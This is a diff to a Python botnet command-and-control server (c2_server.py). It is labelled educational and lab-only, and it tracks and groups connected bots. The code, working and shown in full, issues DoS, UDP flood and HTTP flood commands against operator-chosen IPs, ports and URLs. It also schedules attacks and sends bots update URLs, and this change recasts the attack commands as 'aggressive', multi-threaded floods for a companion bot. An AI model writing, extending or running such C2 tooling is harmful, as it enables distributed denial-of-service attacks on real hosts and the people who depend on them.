@@ -1,14 +1,16 @@
 # c2_server.py - Enhanced for Educational Purposes (Final Consolidation)
 # WARNING: For educational use in isolated labs ONLY. Not for real-world use.
+# Companion to the aggressive, multi-threaded bot.py
 import socket
 import threading
 import time
 import logging
-import json # For potentially receiving structured info if bot sends it
+import json
 
 # --- Configuration ---
-HOST = '0.0.0.0'  # Listen on all available interfaces (Kali VM IP if specific needed)
+HOST = '0.0.0.0'  # Listen on all available interfaces (e.g., Kali VM IP)
 PORT = 9999
+# Ensure this key matches the bot's key exactly
 SECRET_KEY = b"MySuperSecretKey123" # Simple XOR 'encryption' - NOT SECURE FOR REAL USE
 # --- --- --- --- --- ---
 
@@ -130,22 +132,15 @@ def handle_bot(bot_socket, bot_address):
 
         # Main loop: Listens passively or handles keep-alives.
         # Assumes bot sends data only when commanded (or for initial registration).
-        # Real C2 might have more active polling or bot-initiated comms.
         while True:
-            # Basic Keep-Alive Check (Optional, can be improved)
-            # Send a PING every so often to check if socket is writable.
+            # Basic Keep-Alive Check (Optional)
             time.sleep(30) # Check every 30 seconds
             try:
                  bot_socket.sendall(encrypt_decrypt(b'PING'))
-                 # Could optionally wait for a PONG response with timeout here
-                 # pong_data = bot_socket.recv(1024) # Requires bot PONG logic
+                 # Could wait for PONG here if needed
             except socket.error as e:
                  logging.warning(f"[-] Ping failed for Bot ID {bot_id}. Connection likely lost: {e}")
-                 break # Exit loop if send fails, triggers finally block
-
-            # Add logic here to handle unsolicited messages from the bot if needed
-            # E.g., receiving status updates or task results. Requires non-blocking
-            # recv or select/poll mechanism. For simplicity, we assume C2 commands only.
+                 break # Exit loop if send fails
 
     # Handle expected connection errors (disconnect)
     except (socket.error, ConnectionResetError, BrokenPipeError) as e:
@@ -158,13 +153,10 @@ def handle_bot(bot_socket, bot_address):
         logging.info(f"[-] Bot disconnected: ID {bot_id} ({bot_address})")
         with bots_lock:
             if bot_id in connected_bots:
-                # Socket may already be closed, but try closing again just in case.
                 try:
                     connected_bots[bot_id]['socket'].close()
-                except (socket.error, Exception):
-                    pass # Ignore errors during cleanup close
-                del connected_bots[bot_id] # Remove from tracking
-        # Ensure socket is closed if it exists but wasn't in dict (shouldn't happen)
+                except (socket.error, Exception): pass
+                del connected_bots[bot_id]
         if 'bot_socket' in locals() and bot_socket.fileno() != -1:
              try: bot_socket.close()
              except: pass
@@ -172,21 +164,22 @@ def handle_bot(bot_socket, bot_address):
 
 def c2_interface():
     """ Provides the command-line interface for managing the C2 server. """
-    print("\n--- C2 Command Interface (v2 - Educational) ---")
+    print("\n--- C2 Command Interface (v2 - For Aggressive Bot) ---")
     print("Targets: ALL, GROUP:<name>, <bot_id>")
     print("Commands:")
     print("  LIST                 - List connected bots and groups")
     print("  GROUP <bot_id> <group_name> - Assign bot to a group")
-    print("  INFO <target>        - Request basic info from target(s) (bot handles response)")
-    print("  DOS <target> <ip> <port> - Send DoS command")
-    print("  UDP <target> <ip> <port> <size> - Send UDP Flood command")
-    print("  HTTP <target> <url>  - Send HTTP Flood command")
-    print("  SCHEDULE <target> <HH:MM:SS> <command...> - Tell bot to schedule command (bot-side, 24h time)")
-    print("  UPDATE <target> <url>  - Tell bot to simulate self-update from URL")
+    print("  INFO <target>        - Request basic info from target(s)")
+    print("  DOS <target> <ip> <port> - Send AGGRESSIVE DoS command")
+    print("  UDP <target> <ip> <port> <size> - Send AGGRESSIVE UDP Flood command")
+    print("  HTTP <target> <url>  - Send AGGRESSIVE HTTP Flood command")
+    print("  SCHEDULE <target> <HH:MM:SS> <command...> - Tell bot to schedule command (bot-side)")
+    print("  UPDATE <target> <url>  - Tell bot to SIMULATE self-update from URL")
     print("  EXIT <target>        - Command target bot(s) to exit")
     print("  QUIT                 - Shutdown C2 server")
     print("-------------------------------------------------")
-    print("[!] Ensure target environment (Kali/Windows) firewalls allow C2<->Bot traffic on port", PORT)
+    print("[!] Ensure target environment firewalls allow C2<->Bot traffic on port", PORT)
+    print("[!] WARNING: Attack commands trigger multi-threaded, high-intensity attacks on bots.")
 
     while True:
         try:
@@ -204,22 +197,22 @@ def c2_interface():
                     else:
                         print(f"  Connected bots ({len(connected_bots)}):")
                         groups = {}
-                        # Sort by Bot ID for consistent display
                         sorted_bot_items = sorted(connected_bots.items())
                         for bid, data in sorted_bot_items:
                             grp = data['group']
                             if grp not in groups: groups[grp] = []
-                            # Display basic info if available (bot needs to send it)
                             status = data.get('info', {}).get('status', 'N/A')
                             os_info = data.get('info', {}).get('os', 'N/A')
-                            groups[grp].append(f"ID {bid} ({data['address'][0]}:{data['address'][1]}) Group: {grp} Status: {status} OS: {os_info}")
+                            # Add worker count if bot reported it
+                            workers = data.get('info', {}).get('attack_workers_setting', 'N/A')
+                            groups[grp].append(f"ID {bid} ({data['address'][0]}:{data['address'][1]}) Grp:{grp} St:{status} OS:{os_info} Workers:{workers}")
 
                         sorted_groups = sorted(groups.items())
                         for grp, bots_in_group in sorted_groups:
                              print(f"    Group '{grp}':")
                              for bot_str in bots_in_group:
                                  print(f"      - {bot_str}")
-                continue # LIST command done
+                continue
 
             if command == 'GROUP' and len(parts) == 3:
                  try:
@@ -234,34 +227,30 @@ def c2_interface():
                              print(f"  Bot ID {bot_id_to_group} not found.")
                  except ValueError:
                       print("  Usage: GROUP <bot_id> <group_name>")
-                 continue # GROUP command done
+                 continue
 
             if command == 'QUIT':
                  logging.info("[+] Shutting down C2 server...")
-                 send_command("ALL", "EXIT") # Tell all bots to exit first
+                 send_command("ALL", "EXIT")
                  print("  Sent EXIT command to all bots. Waiting briefly...")
-                 time.sleep(2) # Give bots time to receive and potentially exit
+                 time.sleep(2)
                  with bots_lock:
                      print(f"  Closing remaining {len(connected_bots)} bot sockets...")
-                     # Make a copy of sockets to close to avoid modifying during iteration
                      sockets_to_close = [b['socket'] for b in connected_bots.values()]
                      for bot_socket in sockets_to_close:
-                         try:
-                             bot_socket.close()
+                         try: bot_socket.close()
                          except socket.error: pass
-                 connected_bots.clear() # Clear tracking
-                 # Signal the main accept loop to stop listening
+                 connected_bots.clear()
                  print("  Signaling server socket to close...")
                  try:
                      shutdown_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                     # Connect to localhost if HOST is 0.0.0.0
                      connect_host = '127.0.0.1' if HOST == '0.0.0.0' else HOST
                      shutdown_socket.connect((connect_host, PORT))
                      shutdown_socket.close()
                      print("  Shutdown signal sent.")
                  except Exception as e:
-                     logging.error(f"Error signaling shutdown via connection: {e}. Manual stop might be needed.")
-                 break # Exit C2 interface loop
+                     logging.error(f"Error signaling shutdown via connection: {e}")
+                 break
 
             # --- Commands Requiring a Target Specifier ---
             if len(parts) < 2:
@@ -271,15 +260,12 @@ def c2_interface():
             target = parts[1]
             cmd_args = parts[2:] # Remaining parts are command arguments
 
-            # Construct the command string to send to the bot(s)
             bot_command_str = ""
             if command == 'INFO':
-                if len(cmd_args) == 0:
-                     bot_command_str = "INFO_REQUEST"
+                if len(cmd_args) == 0: bot_command_str = "INFO_REQUEST"
                 else: print("  Usage: INFO <target>"); continue
             elif command == 'DOS' and len(cmd_args) == 2:
                  ip, port = cmd_args[0], cmd_args[1]
-                 # Basic validation (can be improved)
                  try: socket.inet_aton(ip); int(port)
                  except (OSError, ValueError): print(f"  Invalid IP ({ip}) or port ({port})."); continue
                  bot_command_str = f"DOS {ip} {port}"
@@ -295,10 +281,8 @@ def c2_interface():
             elif command == 'SCHEDULE' and len(cmd_args) >= 2:
                  time_spec = cmd_args[0]
                  actual_command = " ".join(cmd_args[1:])
-                 # Validate time format HH:MM:SS (basic)
                  try: time.strptime(time_spec, '%H:%M:%S')
                  except ValueError: print(f"  Invalid time format ({time_spec}). Use HH:MM:SS."); continue
-                 # Validate the command being scheduled (basic check if it's known)
                  if not actual_command.upper().split()[0] in ['DOS', 'UDP', 'HTTP', 'EXIT', 'INFO_REQUEST']:
                       print(f"  Cannot schedule unknown command: {actual_command.split()[0]}")
                       continue
@@ -310,25 +294,19 @@ def c2_interface():
                  bot_command_str = f"UPDATE {update_url}"
                  print(f"  Sending simulated update command to bot(s) for URL: {update_url}")
             elif command == 'EXIT':
-                 if len(cmd_args) == 0:
-                      bot_command_str = "EXIT"
+                 if len(cmd_args) == 0: bot_command_str = "EXIT"
                  else: print("  Usage: EXIT <target>"); continue
             else:
                  print(f"  Unknown command '{command}' or invalid arguments for target.")
-                 continue # Skip sending if command unknown
+                 continue
 
-            # Send the constructed command if one was made
             if bot_command_str:
                 send_command(target, bot_command_str)
             else:
-                 # This case should ideally be caught by checks above, but acts as a fallback.
-                 print(f"  Command '{command}' processed, but no valid action to send to bot was generated.")
+                 print(f"  Command '{command}' processed, but no valid action generated.")
 
-
-        except EOFError: # Handle Ctrl+D
-             print("\nUse QUIT command to exit.")
-        except KeyboardInterrupt: # Handle Ctrl+C
-             print("\nUse QUIT command to exit.")
+        except EOFError: print("\nUse QUIT command to exit.")
+        except KeyboardInterrupt: print("\nUse QUIT command to exit.")
         except Exception as e:
             logging.error(f"[C2 Interface Error] {e}", exc_info=True)
             print(f"  An unexpected error occurred: {e}")
@@ -342,21 +320,17 @@ def accept_connections(server_socket):
     try:
         while True:
             try:
-                # server_socket.accept() blocks until a connection comes in or the socket errors (e.g., on close)
                 client_sock, addr = server_socket.accept()
                 logging.debug(f"Accepted connection from {addr}")
-                # Add IP filtering/blocking or basic authentication checks here if needed
-                # Example: if addr[0] in blocked_ips: client_sock.close(); continue
+                # Add IP filtering/basic auth here if needed
                 thread = threading.Thread(target=handle_bot, args=(client_sock, addr), daemon=True)
                 thread.start()
             except socket.error as e:
-                # This error is expected when the main thread closes the server_socket during shutdown
                 logging.info(f"Server socket accept loop ending (accept failed): {e}")
-                break # Exit loop if socket is closed or errors significantly
+                break # Exit loop if socket is closed or errors
             except Exception as e:
-                 # Log unexpected errors during accept but try to continue listening
                  logging.error(f"Error accepting connection: {e}", exc_info=True)
-                 time.sleep(1) # Avoid tight loop on persistent accept errors
+                 time.sleep(1)
     finally:
         logging.info("Connection acceptance stopped.")
 
@@ -364,40 +338,34 @@ def accept_connections(server_socket):
 def main():
     """ Main function to set up and run the C2 server. """
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Allow address reuse quickly after server restart
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         server_socket.bind((HOST, PORT))
-        server_socket.listen(5) # Listen for up to 5 incoming connections in the backlog
+        server_socket.listen(5)
         logging.info(f"[+] C2 server listening on {HOST}:{PORT}...")
         print(f"[+] C2 server listening on {HOST}:{PORT}...")
     except Exception as e:
         logging.critical(f"[-] Failed to bind C2 server to {HOST}:{PORT}: {e}")
-        print(f"[-] Fatal Error: Could not bind to {HOST}:{PORT}. Is port already in use or IP incorrect? Error: {e}")
-        return # Exit if cannot bind
+        print(f"[-] Fatal Error: Could not bind to {HOST}:{PORT}. Error: {e}")
+        return
 
-    # Start thread for accepting connections - Daemon so it exits when main thread exits
     accept_thread = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
     accept_thread.start()
 
-    # Run C2 command interface in the main thread
-    c2_interface()
+    c2_interface() # Run C2 interface in main thread
 
-    # Cleanup after c2_interface exits (on QUIT command)
     logging.info("Closing server socket.")
     print("Closing server socket...")
-    # Socket should already be closed by the QUIT command signaling, but ensure it.
     try:
-        server_socket.shutdown(socket.SHUT_RDWR) # Politely refuse new/pending connections
-    except OSError as e:
+        # Try to gracefully shutdown read/write ends before closing
+        server_socket.shutdown(socket.SHUT_RDWR)
+    except OSError as e: # May error if socket already closed
         logging.debug(f"Socket shutdown error (may be already closed): {e}")
     except Exception as e:
         logging.error(f"Unexpected error during socket shutdown: {e}")
     finally:
-        try:
-             server_socket.close()
-        except Exception as e:
-             logging.error(f"Unexpected error during final socket close: {e}")
+        try: server_socket.close() # Ensure close is called
+        except Exception as e: logging.error(f"Unexpected error during final socket close: {e}")
 
     logging.info("C2 server shutdown sequence complete.")
     print("C2 server shutdown complete.")
